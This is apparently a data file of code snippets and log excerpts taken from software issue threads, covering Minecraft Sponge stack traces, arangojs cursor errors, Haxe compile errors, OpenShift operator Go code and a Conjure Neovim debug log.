org.spongepowered.common.event.tracking.context.MultiBlockCaptureSupplier.processTransactions(MultiBlockCaptureSupplier.java:727) */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     org.spongepowered.common.event.tracking.TrackingUtil.processBlockCaptures(TrackingUtil.java:437)                                  */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     org.spongepowered.common.event.tracking.TrackingUtil.processBlockCaptures(TrackingUtil.java:411)                                  */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     org.spongepowered.common.event.tracking.phase.tick.TileEntityTickPhaseState.unwind(TileEntityTickPhaseState.java:123)             */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     org.spongepowered.common.event.tracking.phase.tick.TileEntityTickPhaseState.unwind(TileEntityTickPhaseState.java:71)              */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     org.spongepowered.common.event.tracking.PhaseTracker.completePhase(PhaseTracker.java:318)                                         */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     org.spongepowered.common.event.tracking.PhaseContext.close(PhaseContext.java:613)                                                 */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     org.spongepowered.common.event.tracking.TrackingUtil.tickTileEntity(TrackingUtil.java:259)                                        */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     net.minecraft.world.WorldServer.updateTileEntity(WorldServer.java:3167)                                                           */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     net.minecraft.world.WorldServer.redirect$onUpdateTileEntities$zme000(WorldServer.java:3151)                                       */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     net.minecraft.world.World.func_72939_s(World.java:6842)                                                                           */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     net.minecraft.world.WorldServer.func_72939_s(WorldServer.java:2290)                                                               */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     net.minecraft.server.MinecraftServer.func_71190_q(MinecraftServer.java:767)                                                       */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     net.minecraft.server.dedicated.DedicatedServer.func_71190_q(DedicatedServer.java:397)                                             */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     net.minecraft.server.MinecraftServer.func_71217_p(MinecraftServer.java:668)                                                       */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     net.minecraft.server.MinecraftServer.run(MinecraftServer.java:526)                                                                */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     java.lang.Thread.run(Thread.java:748)                                                                                             */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /* java.lang.NullPointerException: null                                                                                                  */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     org.spongepowered.common.event.tracking.PhaseTracker.notifyBlockOfStateChange(PhaseTracker.java:691)                              */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     org.spongepowered.common.event.tracking.context.BlockTransaction$NeighborNotification.process(BlockTransaction.java:578)          */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     org.spongepowered.common.event.tracking.context.MultiBlockCaptureSupplier.processTransactions(MultiBlockCaptureSupplier.java:727) */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     org.spongepowered.common.event.tracking.TrackingUtil.processBlockCaptures(TrackingUtil.java:437)                                  */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     org.spongepowered.common.event.tracking.TrackingUtil.processBlockCaptures(TrackingUtil.java:411)                                  */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     org.spongepowered.common.event.tracking.phase.tick.TileEntityTickPhaseState.unwind(TileEntityTickPhaseState.java:123)             */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     org.spongepowered.common.event.tracking.phase.tick.TileEntityTickPhaseState.unwind(TileEntityTickPhaseState.java:71)              */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     org.spongepowered.common.event.tracking.PhaseTracker.completePhase(PhaseTracker.java:318)                                         */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     org.spongepowered.common.event.tracking.PhaseContext.close(PhaseContext.java:613)                                                 */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     org.spongepowered.common.event.tracking.TrackingUtil.tickTileEntity(TrackingUtil.java:259)                                        */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     net.minecraft.world.WorldServer.updateTileEntity(WorldServer.java:3167)                                                           */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     net.minecraft.world.WorldServer.redirect$onUpdateTileEntities$zme000(WorldServer.java:3151)                                       */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     net.minecraft.world.World.func_72939_s(World.java:6842)                                                                           */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     net.minecraft.world.WorldServer.func_72939_s(WorldServer.java:2290)                                                               */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     net.minecraft.server.MinecraftServer.func_71190_q(MinecraftServer.java:767)                                                       */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     net.minecraft.server.dedicated.DedicatedServer.func_71190_q(DedicatedServer.java:397)                                             */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     net.minecraft.server.MinecraftServer.func_71217_p(MinecraftServer.java:668)                                                       */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     net.minecraft.server.MinecraftServer.run(MinecraftServer.java:526)                                                                */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*     java.lang.Thread.run(Thread.java:748)                                                                                             */\r\n[16:29:12] [Server thread/DEBUG] [MultiBlockCaptureSupplier]: /*****************************************************************************************************************************************/\r\n"
    },
    {
        "logs": "`lua\r\n        describe(\"spies\", function()\r\n            it(\"replaces an original function\", function()\r\n                local t = {\r\n                    defaultmsg = \"hiii\",\r\n                    somerandomproperty = true,\r\n                }\r\n\r\n                function t:greet(msg) if msg then print(msg) else print(self.defaultmsg) end end\r\n\r\n                local s = spy.on(t, \"greet\")\r\n\r\n                t:greet(\"Hey!\") -- prints 'Hey!'\r\n                assert.spy(t.greet).was_called_with(t, \"Hey!\")\r\n\r\n                t:greet(\"Hey!\") -- prints 'Hey!'\r\n\r\n                -- when touching t the next assert fails\r\n                t.somerandomproperty = false\r\n                assert.spy(t.greet).was_called_with(t1, \"Hey!\")\r\n            end)\r\n        end)\r\n"
    },
    {
        "logs": "`\r\n$a = Get-Foo | ConvertTo-Json\r\n$b = Get-Bar\r\n$c = Get-BarFoo\r\n$d = Get-FooBar\r\n$e = Get-FooFoo\r\n$f = Get-BarBar\r\n$g = Get-FooUsing -Parameter $a\r\nDo-SomethingThatChangesGlobalState\r\n"
    },
    {
        "logs": "`\r\n#pureFunctions\r\n$a = Get-Foo | ConvertTo-Json\r\n$b = Get-Bar\r\n$c = Get-BarFoo\r\n$d = Get-FooBar\r\n$e = Get-FooFoo\r\n$f = Get-BarBar\r\n$g = Get-FooUsing -Parameter $a\r\nbarrier\r\nDo-SomethingThatChangesGlobalState\r\nbarrier\r\n"
    },
    {
        "logs": "```\r\n$a = Get-Foo | ConvertTo-Json\r\n$b = Get-Bar\r\n$c = Get-BarFoo\r\n$d = Get-FooBar\r\n$e = Get-FooFoo\r\n$f = Get-BarBar\r\n$g = Get-FooUsing -Parameter $a\r\nDo-SomethingThatChangesGlobalState\r\n"
    },
    {
        "logs": "```\r\n#pureFunctions\r\n$a = Get-Foo | ConvertTo-Json\r\n$b = Get-Bar\r\n$c = Get-BarFoo\r\n$d = Get-FooBar\r\n$e = Get-FooFoo\r\n$f = Get-BarBar\r\n$g = Get-FooUsing -Parameter $a\r\nbarrier\r\nDo-SomethingThatChangesGlobalState\r\nbarrier\r\n"
    },
    {
        "logs": "`\r\n{\"detail\": \"RGW REST API failed request with status code 400\\n(b'{\\\"Code\\\":\\\"InvalidLocationConstraint\\\",\\\"Message\\\":\\\"The specified location-constr'\\n b'aint is not valid\\\",\\\"BucketName\\\":\\\"tst01\\\",\\\"RequestId\\\":\\\"tx00000000000000010cda3'\\n b'-005f4fa675-30219-s3\\\",\\\"HostId\\\":\\\"30219-s3-s3\\\"}')\", \"component\": \"rgw\"}\r\n"
    },
    {
        "logs": "`\r\ncode block: https://github.com/sympy/sympy/blob/master/sympy/polys/rootisolation.py#L274\n<issue_comment>username_1: I think you are citing the 2nd example as proof that the routine handles bad input. \r\n\r\nThis is a very low level routine (which should actually be private IMO) and I'm not sure that adding a test to see that s and t both satisfy f is a good idea since this routine is called by functions that already have that under control; you are jumping into this function (because you can) with bad input and getting a bad answer. I don't think any modification to the function should be made other than perhaps making it (and others) private (or marking those that should be public facing as "
    },
    {
        "logs": "`\r\nfoo/node_modules/arangojs/lib/cursor.js:48\r\n      self._index = self._result.length;\r\n                                ^\r\nTypeError: Cannot read property 'length' of undefined\r\n    at foo/node_modules/arangojs/lib/cursor.js:48:33\r\n    at foo/node_modules/arangojs/lib/cursor.js:25:32\r\n    at ArrayCursor.extend._more (foo/node_modules/arangojs/lib/cursor.js:32:25)\r\n    at ArrayCursor.extend._drain (foo/node_modules/arangojs/lib/cursor.js:23:10)\r\n    at ArrayCursor.extend.all (foo/node_modules/arangojs/lib/cursor.js:47:10)\r\n"
    },
    {
        "logs": "`JavaScript\r\ndb.collection('As')\r\n  .then(function(collection) {\r\n    return insertGazillionAs(collection);\r\n  }).then(function() {\r\n    return db.collection('Bs')\r\n  }).then(function(collection) {\r\n    return insertGazillionBs(collection);\r\n  }).then(function() {\r\n    return db.collection('Cs')\r\n  }).then(function(collection) {\r\n    return insertGazillionCs(collection);\r\n  }).then(function() {\r\n    console.log('all done :)');\r\n  }).catch(function(error) {\r\n    console.error(error.stack);\r\n  });\r\n"
    },
    {
        "logs": "```\r\nfoo/node_modules/arangojs/lib/cursor.js:48\r\n      self._index = self._result.length;\r\n                                ^\r\nTypeError: Cannot read property 'length' of undefined\r\n    at foo/node_modules/arangojs/lib/cursor.js:48:33\r\n    at foo/node_modules/arangojs/lib/cursor.js:25:32\r\n    at ArrayCursor.extend._more (foo/node_modules/arangojs/lib/cursor.js:32:25)\r\n    at ArrayCursor.extend._drain (foo/node_modules/arangojs/lib/cursor.js:23:10)\r\n    at ArrayCursor.extend.all (foo/node_modules/arangojs/lib/cursor.js:47:10)\r\n"
    },
    {
        "logs": "```JavaScript\r\ndb.collection('As')\r\n  .then(function(collection) {\r\n    return insertGazillionAs(collection);\r\n  }).then(function() {\r\n    return db.collection('Bs')\r\n  }).then(function(collection) {\r\n    return insertGazillionBs(collection);\r\n  }).then(function() {\r\n    return db.collection('Cs')\r\n  }).then(function(collection) {\r\n    return insertGazillionCs(collection);\r\n  }).then(function() {\r\n    console.log('all done :)');\r\n  }).catch(function(error) {\r\n    console.error(error.stack);\r\n  });\r\n"
    },
    {
        "logs": "`\r\ndup :: a -> (a, a)\r\ndup x = (x, x) -- Illegal!\r\n\r\nforget :: (a, b) -> a\r\nforget (a, b) = a -- Also illegal!\r\n\r\nchoose :: a -> b -> Either a b\r\nchoose a b =\r\n  if a == b\r\n    then Left a    -- Error, a was already used\r\n    else Right b  -- Error, b was already used\r\n"
    },
    {
        "logs": "```\r\ndup :: a -> (a, a)\r\ndup x = (x, x) -- Illegal!\r\n\r\nforget :: (a, b) -> a\r\nforget (a, b) = a -- Also illegal!\r\n\r\nchoose :: a -> b -> Either a b\r\nchoose a b =\r\n  if a == b\r\n    then Left a    -- Error, a was already used\r\n    else Right b  -- Error, b was already used\r\n"
    },
    {
        "logs": "`Feature :formatters cannot be installed. Unsupported Javascript context: Mozilla/5.0 (Macintosh; Intel Mac OS X) AppleWebKit/538.1 (KHTML, like Gecko) capybara-webkit Safari/538.1."
    },
    {
        "logs": "`\r\nsrc\\haxe\\root\\Point.java:26: error: getY() in Point cannot implement getY() in IY\r\n        public int getY()\r\n                   ^\r\n  return type int is not compatible with double\r\n"
    },
    {
        "logs": "`\r\nsrc\\haxe\\root\\Point.java:7: error: Point is not abstract and does not override abstract method getY() in IYInt\r\npublic class Point extends haxe.lang.HxObject implements haxe.root.IYInt, haxe.root.IYFloat\r\n       ^\r\nsrc\\haxe\\root\\Point.java:26: error: getY() in Point cannot implement getY() in IYInt\r\n        public double getY()\r\n                      ^\r\n  return type double is not compatible with int\r\n2 errors\r\n"
    },
    {
        "logs": "`\r\nkuujo [11:07 PM]\r\n[...]. Basically, all the snapshots are stored in a single file. So a snapshot file will have a snapshot for primitive A, then primitive B, etc. \r\n\r\n[...]\r\n\r\n// some guy gets a OOM exception\r\nkuujo [6:46 PM]\r\nYeah... it seems like the only place that could conceivably happen is when taking snapshots of a very large set of state machines. The underlying array is dynamically resized, and if the bytes reach 1G + 1 I suspect it will be resized to "
    },
    {
        "logs": "```\r\nkuujo [11:07 PM]\r\n[...]. Basically, all the snapshots are stored in a single file. So a snapshot file will have a snapshot for primitive A, then primitive B, etc. \r\n\r\n[...]\r\n\r\n// some guy gets a OOM exception\r\nkuujo [6:46 PM]\r\nYeah... it seems like the only place that could conceivably happen is when taking snapshots of a very large set of state machines. The underlying array is dynamically resized, and if the bytes reach 1G + 1 I suspect it will be resized to `Integer.MAX_VALUE`\r\n"
    },
    {
        "logs": "`\n<issue_comment>username_0: The request to the API hangs until this runs, instead of causing an error or rejecting the request. I should also mention that a "
    },
    {
        "logs": "` defined. Do we have to handle this in the lambda?\n<issue_comment>username_0: # Steps to Reproduce\r\n\r\n1. Clone https://github.com/username_0/now-dev-issue\r\n2. Run "
    },
    {
        "logs": "` runs.\n<issue_comment>username_0: downloading user files...\r\ninstalling dependencies for user's code...\r\ninstalling to /var/folders/48/zm1g8wcn5f9b2q6jk7mfrcrh0000gn/T/co.zeit.now/dev/workPaths/3jca4sbo/user/api/v1/status\r\nyarn install v1.15.2\r\ninfo No lockfile found.\r\n[1/4] \ud83d\udd0d  Resolving packages...\r\n[2/4] \ud83d\ude9a  Fetching packages...\r\n[3/4] \ud83d\udd17  Linking dependencies...\r\n[4/4] \ud83d\udd28  Building fresh packages...\r\nsuccess Saved lockfile.\r\n\u2728  Done in 16.00s.\r\nwriting ncc package.json...\r\ninstalling dependencies for ncc...\r\ninstalling to /var/folders/48/zm1g8wcn5f9b2q6jk7mfrcrh0000gn/T/co.zeit.now/dev/workPaths/3jca4sbo/ncc\r\nyarn install v1.15.2\r\ninfo No lockfile found.\r\n[1/4] \ud83d\udd0d  Resolving packages...\r\n[2/4] \ud83d\ude9a  Fetching packages...\r\n[3/4] \ud83d\udd17  Linking dependencies...\r\n[4/4] \ud83d\udd28  Building fresh packages...\r\nsuccess Saved lockfile.\r\n\u2728  Done in 1.44s.\r\n"
    },
    {
        "logs": "` Failed to list *unstructured.Unstructured: replicationcontrollers.extensions is forbidden:\r\n      Failed to list *unstructured.Unstructured: deploymentconfigs.apps.openshift.io \"rollback\" not found\r\n      Failed to list *unstructured.Unstructured: nodes is forbidden: \r\n     Failed to list *unstructured.Unstructured: imagesignatures.image.openshift.io is forbidden\r\n     Failed to list *unstructured.Unstructured: pods \"proxy\"\r\n     Failed to list *unstructured.Unstructured: deploymentconfigs.apps.openshift.io \"log\" not found\r\n "
    },
    {
        "logs": "`go\r\nfunc filterGKVsFromAddToScheme() ([]schema.GroupVersionKind, error) {\r\n    filteredGVK, err := k8sutil.GetGVKsFromAddToScheme(apis.AddToScheme)\r\n    if err != nil {\r\n        return nil, err\r\n    }\r\n\t\r\n    // types that will be ignored\r\n    ignoreList := []schema.GroupVersionKind{\r\n        // OCP types\r\n        schema.GroupVersionKind{Group: \"route.openshift.io\", Kind: \"Route\", Version: \"*\"},\r\n        schema.GroupVersionKind{Group: \"image.openshift.io\", Kind: \"ImageStream\", Version: \"*\"},\r\n        schema.GroupVersionKind{Group: \"apps.openshift.io\", Kind: \"DeploymentConfig\", Version: \"*\"},\r\n        // Others Operators API\r\n        schema.GroupVersionKind{Group: \"example.appservice.com\", Kind: \"AppService\", Version: \"*\"},\r\n        // Kubernetes types \r\n        schema.GroupVersionKind{Kind: \"PersistentVolumeClaim\", Version: \"*\"},\r\n        schema.GroupVersionKind{Kind: \"ServiceAccount\", Version: \"*\"},\r\n    }\r\n\r\n    ownGVKs := []schema.GroupVersionKind{}\r\n    for _, gvk:= range filteredGVK {\r\n        for _, ignoreGKV := range ignoreList {\r\n            if !hasMatch(ignoreGKV, gvk) {\r\n            \townGVKs = append(ownGVKs, gvk)\r\n            }\r\n        }\r\n    }\r\n\r\n    return ownGVKs, nil\r\n}\r\n\r\nfunc hasMatch(ignoreGKV schema.GroupVersionKind, gvk schema.GroupVersionKind) bool {\r\n    if ignoreGKV.Kind == \"*\" && ignoreGKV.Group == \"*\" && ignoreGKV.Version == \"*\" {\r\n        return false\r\n    } else {\r\n        if (ignoreGKV.Kind != \"*\" && ignoreGKV.Kind != gvk.Kind) ||\r\n            (ignoreGKV.Group != \"*\" && ignoreGKV.Group != gvk.Group) ||\r\n            (ignoreGKV.Version != \"*\" && ignoreGKV.Version != gvk.Version) {\r\n            return false\r\n        }\r\n    }\r\n}\r\n"
    },
    {
        "logs": "``` Failed to list *unstructured.Unstructured: replicationcontrollers.extensions is forbidden:\r\n      Failed to list *unstructured.Unstructured: deploymentconfigs.apps.openshift.io \"rollback\" not found\r\n      Failed to list *unstructured.Unstructured: nodes is forbidden: \r\n     Failed to list *unstructured.Unstructured: imagesignatures.image.openshift.io is forbidden\r\n     Failed to list *unstructured.Unstructured: pods \"proxy\"\r\n     Failed to list *unstructured.Unstructured: deploymentconfigs.apps.openshift.io \"log\" not found\r\n "
    },
    {
        "logs": "```go\r\nfunc filterGKVsFromAddToScheme() ([]schema.GroupVersionKind, error) {\r\n    filteredGVK, err := k8sutil.GetGVKsFromAddToScheme(apis.AddToScheme)\r\n    if err != nil {\r\n        return nil, err\r\n    }\r\n\t\r\n    // types that will be ignored\r\n    ignoreList := []schema.GroupVersionKind{\r\n        // OCP types\r\n        schema.GroupVersionKind{Group: \"route.openshift.io\", Kind: \"Route\", Version: \"*\"},\r\n        schema.GroupVersionKind{Group: \"image.openshift.io\", Kind: \"ImageStream\", Version: \"*\"},\r\n        schema.GroupVersionKind{Group: \"apps.openshift.io\", Kind: \"DeploymentConfig\", Version: \"*\"},\r\n        // Others Operators API\r\n        schema.GroupVersionKind{Group: \"example.appservice.com\", Kind: \"AppService\", Version: \"*\"},\r\n        // Kubernetes types \r\n        schema.GroupVersionKind{Kind: \"PersistentVolumeClaim\", Version: \"*\"},\r\n        schema.GroupVersionKind{Kind: \"ServiceAccount\", Version: \"*\"},\r\n    }\r\n\r\n    ownGVKs := []schema.GroupVersionKind{}\r\n    for _, gvk:= range filteredGVK {\r\n        for _, ignoreGKV := range ignoreList {\r\n            if !hasMatch(ignoreGKV, gvk) {\r\n            \townGVKs = append(ownGVKs, gvk)\r\n            }\r\n        }\r\n    }\r\n\r\n    return ownGVKs, nil\r\n}\r\n\r\nfunc hasMatch(ignoreGKV schema.GroupVersionKind, gvk schema.GroupVersionKind) bool {\r\n    if ignoreGKV.Kind == \"*\" && ignoreGKV.Group == \"*\" && ignoreGKV.Version == \"*\" {\r\n        return false\r\n    } else {\r\n        if (ignoreGKV.Kind != \"*\" && ignoreGKV.Kind != gvk.Kind) ||\r\n            (ignoreGKV.Group != \"*\" && ignoreGKV.Group != gvk.Group) ||\r\n            (ignoreGKV.Version != \"*\" && ignoreGKV.Version != gvk.Version) {\r\n            return false\r\n        }\r\n    }\r\n}\r\n"
    },
    {
        "logs": "`\r\n20-04-08 19:49:44 arch-desktop INFO [conjure.main:39] - Logging initialised\r\n20-04-08 19:49:44 arch-desktop INFO [conjure.main:41] - System versions\r\n=== Conjure ===\r\nv2.1.2-2-gd3356a4de4\r\n\r\n=== OS ===\r\nLinux arch-desktop 5.4.6-arch1-1 #1 SMP PREEMPT Sat, 21 Dec 2019 16:34:41 +0000 x86_64 GNU/Linux\r\n\r\n=== Neovim ===\r\nNVIM v0.4.3\r\nBuild type: Release\r\nLuaJIT 2.0.5\r\nCompilation: /usr/bin/cc -march=x86-64 -mtune=generic -O2 -pipe -fno-plt -O2 -DNDEBUG -DMIN_LOG_LEVEL=3 -Wall -Wextra -pedantic -Wno-unused-parameter -Wstrict-prototypes -std=gnu99 -Wshadow -Wconversion -Wmissing-prototypes -Wimplicit-fallthrough -Wvla -fstack-protector-strong -fdiagnostics-color=always -DINCLUDE_GENERATED_DECLARATIONS -D_GNU_SOURCE -DNVIM_MSGPACK_HAS_FLOAT32 -DNVIM_UNIBI_HAS_VAR_FROM -I/build/neovim/src/build/config -I/build/neovim/src/neovim-0.4.3/src -I/usr/include -I/build/neovim/src/build/src/nvim/auto -I/build/neovim/src/build/include\r\nCompiled by builduser\r\n\r\nFeatures: +acl +iconv +tui\r\nSee \":help feature-compile\"\r\n\r\n   system vimrc file: \"$VIM/sysinit.vim\"\r\n  fall-back for $VIM: \"/usr/share/nvim\"\r\n\r\nRun :checkhealth for more info\r\n\r\n=== Java ===\r\nopenjdk version \"1.8.0_232\"\r\nOpenJDK Runtime Environment (build 1.8.0_232-b09)\r\nOpenJDK 64-Bit Server VM (build 25.232-b09, mixed mode)\r\n\r\n20-04-08 19:49:44 arch-desktop INFO [conjure.rpc:195] - Starting RPC TCP server on port 39803\r\n20-04-08 19:49:44 arch-desktop INFO [conjure.rpc:207] - Starting RPC loops\r\n20-04-08 19:49:44 arch-desktop INFO [conjure.prepl:243] - Started prepl server on port 40361\r\n20-04-08 19:49:44 arch-desktop TRACE [conjure.rpc:175] - Received RPC message: {:type :notify, :method :up, :params [\"\"], :client :stdio}\r\n20-04-08 19:49:44 arch-desktop TRACE [conjure.rpc:163] - Sending RPC message: {:type :request, :client :stdio, :id 1, :method :nvim-set-var, :params [\"conjure_ready\" 1]}\r\n20-04-08 19:49:44 arch-desktop TRACE [conjure.rpc:163] - Sending RPC message: {:type :request, :client :stdio, :id 2, :method :nvim-get-current-buf, :params nil}\r\n20-04-08 19:49:44 arch-desktop TRACE [conjure.rpc:175] - Received RPC message: {:type :response, :id 1, :error nil, :result nil, :client :stdio}\r\n20-04-08 19:49:44 arch-desktop INFO [conjure.main:46] - Everything's ready! Let's perform some magic.\r\n20-04-08 19:49:44 arch-desktop TRACE [conjure.rpc:175] - Received RPC message: {:type :response, :id 2, :error nil, :result #msgpack.core.Ext{:type 0, :data #object[\"[B\" 0x53da95bb \"[B@53da95bb\"]}, :client :stdio}\r\n20-04-08 19:49:44 arch-desktop TRACE [conjure.rpc:163] - Sending RPC message: {:type :request, :client :stdio, :id 1, :method :nvim-call-atomic, :params [([\"nvim_buf_get_name\" [#msgpack.core.Ext{:type 0, :data #object[\"[B\" 0x53da95bb \"[B@53da95bb\"]}]] [\"nvim_buf_line_count\" [#msgpack.core.Ext{:type 0, :data #object[\"[B\" 0x53da95bb \"[B@53da95bb\"]}]] [\"nvim_buf_get_lines\" [#msgpack.core.Ext{:type 0, :data #object[\"[B\" 0x53da95bb \"[B@53da95bb\"]} 0 25 false]] [\"nvim_get_current_win\" []] [\"nvim_call_function\" [\"getcwd\" (0)]])]}\r\n20-04-08 19:49:44 arch-desktop TRACE [conjure.rpc:175] - Received RPC message: {:type :response, :id 1, :error nil, :result [[\"/home/colin/projects/aok-elo-graph-front-end/src/aok_elo_graph_front_end/core.cljs\" 42 [\"(ns ^:figwheel-hooks aok-elo-graph-front-end.core\" \"  (:require\" \"   [goog.dom :as gdom]\" \"   [reagent.core :as reagent :refer [atom]]))\" \"\" \"(println \\\"This text is printed from src/aok_elo_graph_front_end/core.cljs. Go ahead and edit it and see reloading in action.\\\")\" \"\" \"(defn multiply [a b] (* a b))\" \"\" \"\" \";; define your app data so that it doesn't get over-written on reload\" \"(defonce app-state (atom {:text \\\"cats\\\"}))\" \"\" \"(defn get-app-element []\" \"  (gdom/getElement \\\"app\\\"))\" \"\" \"(defn hello-world []\" \"  [:div\" \"   [:h1 (:text @app-state)]\" \"   [:h3 \\\"Edit this in src/aok_elo_graph_front_end/core.cljs and watch it change!\\\"]])\" \"\" \"(defn mount [el]\" \"  (reagent/render-component [hello-world] el))\" \"\" \"(defn mount-app-element []\"] #msgpack.core.Ext{:type 1, :data #object[\"[B\" 0x1253eb17 \"[B@1253eb17\"]} \"/home/colin/projects/aok-elo-graph-front-end\"] nil], :client :stdio}\r\n20-04-08 19:49:44 arch-desktop INFO [conjure.prepl:131] - Adding :pfig 127.0.0.1 6776\r\n20-04-08 19:49:44 arch-desktop TRACE [conjure.rpc:163] - Sending RPC message: {:type :request, :client :stdio, :id 1, :method :nvim-get-var, :params [\"conjure_log_blacklist\"]}\r\n20-04-08 19:49:44 arch-desktop TRACE [conjure.rpc:175] - Received RPC message: {:type :response, :id 1, :error nil, :result [], :client :stdio}\r\n20-04-08 19:49:44 arch-desktop TRACE [conjure.rpc:163] - Sending RPC message: {:type :request, :client :stdio, :id 1, :method :nvim-execute-lua, :params [\"return require('conjure').upsert_log(...)\" (\"/tmp/conjure.cljc\" \"small\" false false true)]}\r\n20-04-08 19:49:44 arch-desktop TRACE [conjure.rpc:175] - Received RPC message: {:type :notify, :method :clear-virtual, :params [0], :client :stdio}\r\n20-04-08 19:49:44 arch-desktop TRACE [conjure.rpc:163] - Sending RPC message: {:type :request, :client :stdio, :id 2, :method :nvim-get-current-buf, :params nil}\r\n20-04-08 19:49:44 arch-desktop TRACE [conjure.rpc:175] - Received RPC message: {:type :response, :id 1, :error nil, :result {\"buf\" 3, \"win\" 1001}, :client :stdio}\r\n20-04-08 19:49:44 arch-desktop TRACE [conjure.rpc:175] - Received RPC message: {:type :response, :id 2, :error nil, :result #msgpack.core.Ext{:type 0, :data #object[\"[B\" 0x7dc6aec \"[B@7dc6aec\"]}, :client :stdio}\r\n20-04-08 19:49:44 arch-desktop TRACE [conjure.rpc:163] - Sending RPC message: {:type :request, :client :stdio, :id 1, :method :nvim-call-atomic, :params [([\"nvim_buf_get_name\" [#msgpack.core.Ext{:type 0, :data #object[\"[B\" 0x7dc6aec \"[B@7dc6aec\"]}]] [\"nvim_buf_line_count\" [#msgpack.core.Ext{:type 0, :data #object[\"[B\" 0x7dc6aec \"[B@7dc6aec\"]}]] [\"nvim_buf_get_lines\" [#msgpack.core.Ext{:type 0, :data #object[\"[B\" 0x7dc6aec \"[B@7dc6aec\"]} 0 25 false]] [\"nvim_get_current_win\" []] [\"nvim_call_function\" [\"getcwd\" (0)]])]}\r\n20-04-08 19:49:44 arch-desktop TRACE [conjure.rpc:163] - Sending RPC message: {:type :request, :client :stdio, :id 2, :method :nvim-buf-line-count, :params [3]}\r\n20-04-08 19:49:44 arch-desktop TRACE [conjure.rpc:175] - Received RPC message: {:type :response, :id 1, :error nil, :result [[\"/home/colin/projects/aok-elo-graph-front-end/src/aok_elo_graph_front_end/core.cljs\" 42 [\"(ns ^:figwheel-hooks aok-elo-graph-front-end.core\" \"  (:require\" \"   [goog.dom :as gdom]\" \"   [reagent.core :as reagent :refer [atom]]))\" \"\" \"(println \\\"This text is printed from src/aok_elo_graph_front_end/core.cljs. Go ahead and edit it and see reloading in action.\\\")\" \"\" \"(defn multiply [a b] (* a b))\" \"\" \"\" \";; define your app data so that it doesn't get over-written on reload\" \"(defonce app-state (atom {:text \\\"cats\\\"}))\" \"\" \"(defn get-app-element []\" \"  (gdom/getElement \\\"app\\\"))\" \"\" \"(defn hello-world []\" \"  [:div\" \"   [:h1 (:text @app-state)]\" \"   [:h3 \\\"Edit this in src/aok_elo_graph_front_end/core.cljs and watch it change!\\\"]])\" \"\" \"(defn mount [el]\" \"  (reagent/render-component [hello-world] el))\" \"\" \"(defn mount-app-element []\"] #msgpack.core.Ext{:type 1, :data #object[\"[B\" 0xada2253 \"[B@ada2253\"]} \"/home/colin/projects/aok-elo-graph-front-end\"] nil], :client :stdio}\r\n20-04-08 19:49:44 arch-desktop TRACE [conjure.rpc:175] - Received RPC message: {:type :response, :id 2, :error nil, :result 1, :client :stdio}\r\n20-04-08 19:49:44 arch-desktop TRACE [conjure.rpc:163] - Sending RPC message: {:type :request, :client :stdio, :id 1, :method :nvim-call-atomic, :params [([\"nvim_buf_set_lines\" [3 0 1 false [\"; conjure/out | Welcome to Conjure! (v2.1.2-2-gd3356a4de4)\"]]] [\"nvim_buf_set_lines\" [3 -1 -1 false (\"; conjure/up | Adding :pfig\")]] [\"nvim_win_set_cursor\" [1001 [2 0]]])]}\r\n20-04-08 19:49:44 arch-desktop TRACE [conjure.rpc:163] - Sending RPC message: {:type :request, :client :stdio, :id 2, :method :nvim-create-namespace, :params [\"conjure_virtual_text\"]}\r\n20-04-08 19:49:44 arch-desktop TRACE [conjure.rpc:175] - Received RPC message: {:type :response, :id 1, :error nil, :result [[nil nil nil] nil], :client :stdio}\r\n20-04-08 19:49:44 arch-desktop INFO [conjure.prepl:64] - Connecting through remote-prepl :pfig\r\n20-04-08 19:49:44 arch-desktop TRACE [conjure.rpc:163] - Sending RPC message: {:type :request, :client :stdio, :id 1, :method :nvim-win-get-cursor, :params 